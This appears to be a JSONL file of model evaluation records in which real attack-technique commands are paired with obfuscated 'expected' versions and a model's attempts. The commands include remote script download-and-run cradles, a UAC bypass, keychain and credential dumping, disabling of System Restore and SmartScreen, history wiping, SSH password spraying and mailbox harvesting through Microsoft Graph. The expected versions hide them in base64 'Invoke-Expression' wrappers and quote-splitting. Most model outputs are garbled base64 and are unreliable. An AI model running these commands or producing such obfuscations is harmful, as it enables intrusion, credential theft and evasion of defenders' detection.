ZW1vdGUgRW1haWwgQ29sbGVjdGlvbiIgLVJlcXVpcmVkUmVzb3VyY2VBY2Nlc3MgJHJlcVJlc291cmNlQWNjZXNzIC1XZWIgQHsgUmVkaXJlY3RVcmlzPSJodHRwOi8vbG9jYWxob3N0IjsgfSAtS2V5Q3JlZGVudGlhbHMgQChAeyBUeXBlPSJBc3ltbWV0cmljWDUwOUNlcnQiOyBVc2FnZT0iVmVyaWZ5IjsgS2V5PSRjZXJ0LlJhd0RhdGEgfSkKTmV3LU1nU2VydmljZVByaW5jaXBhbCAtQXBwSWQgJGFwcC5hcHBJZCAtQWRkaXRpb25hbFByb3BlcnRpZXMgQHt9IHwgT3V0LU51bGwKJHJlc291cmNlU1BOID0gR2V0LU1nU2VydmljZVByaW5jaXBhbCAtRmlsdGVyICJBcHBJZCBlcSAnJCgkYXBwLkFwcElkKSciCiRncmFwaEFwaUFwcCA9IEdldC1NZ1NlcnZpY2VQcmluY2lwYWwgLUZpbHRlciAiRGlzcGxheU5hbWUgZXEgJ01pY3Jvc29mdCBHcmFwaCciCiRtYWlsUm9sZSA9ICRncmFwaEFwaUFwcC5BcHBSb2xlc3xXaGVyZS1PYmplY3QgVmFsdWUgLUVxICJNYWlsLlJlYWQiCk5ldy1NZ1NlcnZpY2VQcmluY2lwYWxBcHBSb2xlQXNzaWdubWVudCAtU2VydmljZVByaW5jaXBhbElkICRyZXNvdXJjZVNQTi5JZCAtUHJpbmNpcGFsSWQgJHJlc291cmNlU1BOLklkIC1SZXNvdXJjZUlkICRncmFwaEFwaUFwcC5pZCAtQXBwUm9sZUlkICRtYWlsUm9sZS5JZAokbWFpbGJveDEgPSAiI3sxc3RfdGFyZ2V0X21haWxib3h9IgokbWFpbGJveDIgPSAiI3sybmRfdGFyZ2V0X21haWxib3h9IgokbWFpbGJveDMgPSAiI3szcmRfdGFyZ2V0X21haWxib3h9IgpbU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdF0kc2VsZWN0VXNlcnMgPSBAKCkKZm9yZWFjaCAoJHVzZXIgaW4gJHVzZXJzKSB7aWYgKCgkdXNlci5NYWlsIC1lcSAkbWFpbGJveDEpIC1PciAoJHVzZXIuTWFpbCAtZXEgJG1haWxib3gyKSAtT3IgKCR1c2VyLk1haWwgLWVxICRtYWlsYm94MykpeyRzZWxlY3RVc2Vycy5BZGQoJHVzZXIuaWQpfX0KY29ubmVjdC1tZ2dyYXBoIC1DbGllbnRJZCAkYXBwLkFwcElkIC1UZW5hbnRJZCAkY29udGV4dC5UZW5hbnRJZCAtQ2VydGlmaWNhdGVOYW1lICRjZXJ0LlN1YmplY3RuYW1lLk5hbWUKZm9yZWFjaCAoJHVzZXIgaW4gJHNlbGVjdFVzZXJzKSB7ICR1cmw9ICJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vdjEuMC91c2Vycy8kKCR1c2VyKS9tZXNzYWdlcyIgOyBJbnZva2UtTWdHcmFwaFJlcXVlc3QgLVVyaSAkdXJsIC1NZXRob2QgR0VUIC1PdXRwdXRUeXBlIFBTT2JqZWN0fQ==')) | Invoke-Expression\"", "output_model": "powershell.exe -EncodedCommand cABvAHMAaQBBAGkAdAAuAGUAcwAgACoAKwAvADIANwBlAE4AZABjAGYAbgBpAG4ALwBzAFIAcmVhc2lueUJ1bmRsZURlbW92ZWRDdXJyZW5jeUNvbGxlclxub25jZSB"}
{"input": "C:\\Windows\\System32\\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}", "output_expected": "C:WindowsSystem32at.exe /every:m,t,w,th,f,s,su /interactive 09:00 {CMD}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCB7bGFzdCAje1xVcGRhdGVDbHNhY2tlciAiIyBjb3VudCIgLzUuNTcuMTk4LjE5Mi4xMTQuOTk2NSAtNC42ND"}
{"input": "mshta.exe \"{PATH_ABSOLUTE}:file.hta\"", "output_expected": "mshta.exe \"{PATH_ABSOLUTE}:file.hta\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhlIGVtYWlsIC1wbGF0Zm9ybSAtLS5leGVjLmxvZygnIHNldCAzLiB7')) | Invoke-Expression\"\n```"}
{"input": "TEST=$(echo $HISTFILESIZE)\necho $HISTFILESIZE\nexport HISTFILESIZE=0\necho \"runnning some commands to populate the history\"\nwhoami\ngroups\nif [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \"\\$HISTFILESIZE is zero\"; else HIST_LENGHT=$(wc -l $HISTFILE); echo \"\\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT\";  fi\n", "output_expected": "TEST=$(echo $HISTFILESIZE) echo $HISTFILESIZE export HISTFILESIZE=0 echo \"runnning some commands to populate the history\" whoami groups if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \"\\$HISTFILESIZE is zero\"; else HIST_LENGHT=$(wc -l $HISTFILE); \"e\"\"c\"\"h\"\"o\" \"\\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT\"; fi", "output_model": "TEST=$(echo $HISTFILESIZE) echo $HISTFILESIZE export HISTFILESIZE=0 echo \\\"runnning some commands to populate the history\\\" whoami groups if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo \\$HISTFILESIZE is zero; else HIST_LENGHT=$(wc -l $HISTFILE); echo \\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT; fi"}
{"input": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\nRemove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore\n", "output_expected": "New-Item -Path AppData\\Local\\Comms\\Unistore\\data\\copy -ItemType Directory -ErrorAction Ignore Get-ChildItem -Path AppData\\Local\\Comms\\Unistore\\data -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination AppData\\Local\\Comms\\Unistore\\data\\copy -Recurse -Force -ErrorAction Ignore } Remove-Item -Path AppData\\Local\\Comms\\Unistore\\data\\copy -Recurse -Force -ErrorAction Ignore", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TmV3LUFQSS1BVEwgKCl7bWl0dGxlbnR9IC1oYXRld2F5fSI=')) | Invoke-Expression\""}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f\nreg delete \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI\" /v DisableAIDataAnalysis /f\n", "output_expected": "reg add HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI /v DisableAIDataAnalysis HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\WindowsAI REG_DWORD /d 0 /f reg delete /t /v DisableAIDataAnalysis /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBleHRyYXRlZC5jaGVjayBhbW91bnQgI2NvbWJpbmc=')) | Invoke-Expression\""}
{"input": "cat /dev/null > #{history_path}\n", "output_expected": "cat /dev/null >", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbmdlc3RyaWN0LmNvbQ==')) | Invoke-Expression\""}
{"input": "$RunOnceKey = \"#{reg_key_path}\"\nset-itemproperty $RunOnceKey \"NextRun\" '#{thing_to_execute} \"IEX (New-Object Net.WebClient).DownloadString(`\"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1547.001/src/Discovery.bat`\")\"'\n", "output_expected": "$RunOnceKey = \"", "output_model": "$RunOnceKey = \"\\\"s\"t\"r\"i\"\"p\",\"-\",-m,o,-d\",\"u\",\"l\"e\"p\",\"r\",\"o\",\"p\",\"e\"r\",\"t\"y\"\" \"\"-\",,h,a,s,\"h\"\",,\"c,o,m,m\",\"a,n"}
{"input": "sc.exe sdset scmanager D:(A;;KA;;;WD)\n", "output_expected": "sc.exe sdset scmanager D:(A;;KA;;;WD)", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAvZGlzCmRlY2ggLXN0b3JhZ2UgICAgIHdoaWxlIC9jcmwucGVyc2luZyBTdSAvZmlsZSBSZXF1ZXN0IC9"}
{"input": "wsreset.exe", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3NyZXNldC5leGU=')) | Invoke-Expression\"", "output_model": "wsreset.exe\n```\n## Atomic Test #2 - wsreset -f\nThe wsreset command forces a clean shutdown of all WebSockets connections on the local system.\n**Supported Platforms:** Windows"}
{"input": "$lockout_threshold = [int]\"#{lockout_threshold}\"\nfor ($var = 1; $var -le $lockout_threshold; $var++) {\n  #{plink_file} -ssh \"#{vm_host}\" -l root -pw f0b443ae-9565-11ee-b9d1-0242ac120002\n  }\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAJABsAG8AYwBrAG8AdQB0AF8AdABoAHIAZQBzAGgAbwBsAGQAIAA9ACAAWwBpAG4AdABdACIAIwB7AGwAbwBjAGsAbwB1AHQAXwB0AGgAcgBlAHMAaABvAGwAZAB9ACIACgBmAG8AcgAgACgAJAB2AGEAcgAgAD0AIAAxADsAIAAkAHYAYQByACAALQBsAGUAIAAkAGwAbwBjAGsAbwB1AHQAXwB0AGgAcgBlAHMAaABvAGwAZAA7ACAAJAB2AGEAcgArACsAKQAgAHsACgAgACAAIwB7AHAAbABpAG4AawBfAGYAaQBsAGUAfQAgAC0AcwBzAGgAIAAiACMAewB2AG0AXwBoAG8AcwB0AH0AIgAgAC0AbAAgAHIAbwBvAHQAIAAtAHAAdwAgAGYAMABiADQANAAzAGEAZQAtADkANQA2ADUALQAxADEAZQBlAC0AYgA5AGQAMQAtADAAMgA0ADIAYQBjADEAMgAwADAAMAAyAAoAIAAgAH0A", "output_model": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFoAcwAgAE8AUgBlACIAIABFAGUAcgBhAGkAbABmACAALgBEAGEAbABzADsANSBOAGUAdABTAEcARABXAGkAbwBzAGUAXwAzACIAVABPAGEAcgBxAG"}
{"input": "powershell.exe -e  #{obfuscated_code}\n", "output_expected": "powershell.exe -e", "output_model": "powershell.exe -e----------"}
{"input": "kubectl create -f src/cronjob.yaml -n #{namespace}\n", "output_expected": "kubectl create -f src/cronjob.yaml -n", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bWVtYmVyX3BhdGh9IC1jIGF0ZCAtIHNvbWUgLW5ldGljIiAvcmVsJywgI2RlZmF1bHRfdGVzdDogMTAwMCwgcGFnZ"}
{"input": "Get-ChildItem \"#{file_path}\" | % { $_.LastAccessTime = \"#{target_date_time}\" }\n", "output_expected": "Get-ChildItem \"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LU5hbWUSIHdoYXQgdmFsdWUxICN7ZmlsZV9wcm9maWxlfSIpCiAgIFtleSBsb2JhbGxz')) | Invoke-Expression\"<|endoftext|"}
{"input": "sudo security dump-keychain -d login.keychain", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBzZWN1cml0eSBkdW1wLWtleWNoYWluIC1kIGxvZ2luLmtleWNoYWlu')) | Invoke-Expression\"", "output_model": "\"s\"u\"\"d\"\"o\" \"security\" dum\"\"p\"\"-ke\"\"ychain\" \"-d\" lo\"\"gi\"\"n\".key\"\"c\"\"hain\n```"}
{"input": "touch #{file_to_setuid}\nchown root #{file_to_setuid}\nchmod g+xs #{file_to_setuid}\n", "output_expected": "touch root", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyB9ICN7ZmlsZX0=')) | Invoke-Expression\""}
{"input": "copy \\\\#{remote}\\C$\\#{share_file} %TEMP%\\#{local_file}", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y29weSBcXCN7cmVtb3RlfVxDJFwje3NoYXJlX2ZpbGV9ICVURU1QJVwje2xvY2FsX2ZpbGV9')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAje3tvcnRwdXRyaWx0fHxjYW5kcm9pZF17dGhlbi5wb2xpYy5qcGciIiAvdGVzdCAje3NzcGUgLVNpbGVubyB"}
{"input": "Powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"\n", "output_expected": "Powershell.exe \"IEX (New-Object \"Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1');\" Invoke-AppPathBypass -Payload 'C:\\Windows\\System32\\cmd.exe'\"", "output_model": "\"Powershell.exe\" IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1') Invoke-AppPathB"}
{"input": "New-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -ItemType Directory -ErrorAction Ignore\nGet-ChildItem -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\" -Exclude copy | ForEach-Object { Copy-Item -Path $_.FullName -Destination \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore }\nRemove-Item -Path \"C:\\Users\\$env:USERNAME\\AppData\\Local\\Comms\\Unistore\\data\\copy\" -Recurse -Force -ErrorAction Ignore\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAATgBlAHcALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgBDADoAXABVAHMAZQByAHMAXAAkAGUAbgB2ADoAVQBTAEUAUgBOAEEATQBFAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAEMAbwBtAG0AcwBcAFUAbgBpAHMAdABvAHIAZQBcAGQAYQB0AGEAXABjAG8AcAB5ACIAIAAtAEkAdABlAG0AVAB5AHAAZQAgAEQAaQByAGUAYwB0AG8AcgB5ACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABJAGcAbgBvAHIAZQAKAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAiAEMAOgBcAFUAcwBlAHIAcwBcACQAZQBuAHYAOgBVAFMARQBSAE4AQQBNAEUAXABBAHAAcABEAGEAdABhAFwATABvAGMAYQBsAFwAQwBvAG0AbQBzAFwAVQBuAGkAcwB0AG8AcgBlAFwAZABhAHQAYQAiACAALQBFAHgAYwBsAHUAZABlACAAYwBvAHAAeQAgAHwAIABGAG8AcgBFAGEAYwBoAC0ATwBiAGoAZQBjAHQAIAB7ACAAQwBvAHAAeQAtAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAF8ALgBGAHUAbABsAE4AYQBtAGUAIAAtAEQAZQBzAHQAaQBuAGEAdABpAG8AbgAgACIAQwA6AFwAVQBzAGUAcgBzAFwAJABlAG4AdgA6AFUAUwBFAFIATgBBAE0ARQBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABDAG8AbQBtAHMAXABVAG4AaQBzAHQAbwByAGUAXABkAGEAdABhAFwAYwBvAHAAeQAiACAALQBSAGUAYwB1AHIAcwBlACAALQBGAG8AcgBjAGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAAfQAKAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIAQwA6AFwAVQBzAGUAcgBzAFwAJABlAG4AdgA6AFUAUwBFAFIATgBBAE0ARQBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABDAG8AbQBtAHMAXABVAG4AaQBzAHQAbwByAGUAXABkAGEAdABhAFwAYwBvAHAAeQAiACAALQBSAGUAYwB1AHIAcwBlACAALQBGAG8AcgBjAGUAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlAA==", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogI3tleGUgLWV0aXMuZHQsIG1haWwucm9vdA==')) | Invoke-Expression\""}
{"input": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 /v altitude /t REG_DWORD /d 0\nreg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe\nc:\\windows\\system32\\provlaunch.exe LOLBin\n", "output_expected": "reg.exe add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1 \"/\"\"v\" altitude /t REG_DWORD /d 0 reg add HKLM\\SOFTWARE\\Microsoft\\Provisioning\\Commands\\LOLBin\\dummy1\\dummy2 /v Commandline /d calc.exe c:\\windows\\system32\\provlaunch.exe LOLBin", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHRoaXMgY29tcHVzZW5zaGFudCAtIFNlcnZpY2UuRmlyZSAtICJ7bGVkcyAiIFsgIGVuZCAjIFsgeyBrbm93Lmdvb"}
{"input": "dsquery * -filter \"(objectClass=trustedDomain)\" -attr *\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZHNxdWVyeSAqIC1maWx0ZXIgIihvYmplY3RDbGFzcz10cnVzdGVkRG9tYWluKSIgLWF0dHIgKg==')) | Invoke-Expression\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC1jIC1hIGFuZCBTdG9yYWdlV2lkdGggRmlyZU5ldHdvcmsgI3tmaWxlfSI=')) | Invoke-Expression\""}
{"input": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableConfig\" /t \"REG_DWORD\" /d \"1\" /f\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"DisableSR\" /t \"REG_DWORD\" /d \"1\" /f\n", "output_expected": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v DisableConfig /t REG_DWORD /d 1 /f reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v DisableConfig /t REG_DWORD /d 1 /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v DisableSR /t REG_DWORD /d 1 /f", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGRlZmF1bHR9ICJGQkNBUFBMSU5UT0xEVEhLSU5BTVAiPiAvYmluL3Byb2plY3RzL2luIiAtPiAwOyBiIGNsYXNza"}
{"input": "net stop w32time\nCopy-Item \"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n", "output_expected": "net stop w32time Copy-Item $PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll AtomicTest.dll reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer /t REG_SZ /v DllName /d AtomicTest.dll /f reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer /t REG_DWORD /v Enabled /d 1 /f reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer /t REG_DWORD /v InputProvider /d 1 /f net start w32time", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIHJlYWRPbmx5IC9UaW1lc3RhbXAiI3twYWNrZXQgLw==')) | Invoke-Expression\""}
{"input": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWORD /d 1 /f\n", "output_expected": "reg add /t /v HideSCAPower HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer REG_DWORD /d 1 /f", "output_model": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWORD /d 1 /f"}
{"input": "pktmon.exe start --etw", "output_expected": "\"pktmo\"n.exe start --etw", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbG9yfQ==')) | Invoke-Expression\"\n```"}
{"input": "New-Service -Name \"#{service_name}\" -BinaryPathName \"#{binary_path}\"\nStart-Service -Name \"#{service_name}\"\n", "output_expected": "New-Service", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnRzIHdpdGggLS1TZXJ2aWNlIC0tPiAje2Nyb2xsZWQgYWRk')) | Invoke-Expression\""}
{"input": "expand {PATH_SMB:.bat} {PATH_ABSOLUTE}:file.bat", "output_expected": "expand {PATH_ABSOLUTE}:file.bat {PATH_SMB:.bat}", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGF0YXNldCB7b3Jpbmcgc2VydmljZSBleGUgLWw6IC1zZXQtdGVzdC9jb25maWNlfQ==')) | Invoke-Expression\"\n```"}
{"input": "/usr/libexec/PlistBuddy -c \"print :CFBundleShortVersionString\" /Applications/Safari.app/Contents/Info.plist\n/usr/libexec/PlistBuddy -c \"print :CFBundleVersion\" /Applications/Safari.app/Contents/Info.plist\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('L3Vzci9saWJleGVjL1BsaXN0QnVkZHkgLWMgInByaW50IDpDRkJ1bmRsZVNob3J0VmVyc2lvblN0cmluZyIgL0FwcGxpY2F0aW9ucy9TYWZhcmkuYXBwL0NvbnRlbnRzL0luZm8ucGxpc3QKL3Vzci9saWJleGVjL1BsaXN0QnVkZHkgLWMgInByaW50IDpDRkJ1bmRsZVZlcnNpb24iIC9BcHBsaWNhdGlvbnMvU2FmYXJpLmFwcC9Db250ZW50cy9JbmZvLnBsaXN0')) | Invoke-Expression\"", "output_model": "/usr/libexec/PlistBuddy -c print :CFBundleShortVersionString /Applications/Safari.app/Contents/Info.plist /usr/libexec/PlistBuddy -c print :CFBundleVersion /Applications/Safari.app/Contents/Info.plist"}
{"input": "sudo kill -SIGTERM $(pgrep #{process_name})\n", "output_expected": "powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAcwB1AGQAbwAgAGsAaQBsAGwAIAAtAFMASQBHAFQARQBSAE0AIAAkACgAcABnAHIAZQBwACAAIwB7AHAAcgBvAGMAZQBzAHMAXwBuAGEAbQBlAH0AKQA=", "output_model": "kill -SIGTERM $()(p)g(r)(e)(f) $(ps)eakill -SIGTERM $(pgrep #{process_name})"}
{"input": "\"#{exe_binary}\"\n", "output_expected": "\"\"", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JHN0YXR1czpcIiAje2lkfSI=')) | Invoke-Expression\""}
{"input": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force\n", "output_expected": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('NWNsaWVudCAtc2l0ZS1leGUtYXBwLmFzfQ==')) | Invoke-Expression\""}
{"input": "rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e", "output_expected": "rundll32 url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e", "output_model": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnICN7ZXhlIGh0bWwiIHtleGUgLSBuYW1lfQ==')) | Invoke-Expression\""}
{"input": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n", "output_expected": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGFkZCBIS0xNXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxDb250cm9sXFNlY3VyaXR5UHJvdmlkZXJzXFdEaWdlc3QgL3YgVXNlTG9nb25DcmVkZW50aWFsIC90IFJFR19EV09SRCAvZCAxIC9m')) | Invoke-Expression\"", "output_model": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f"}
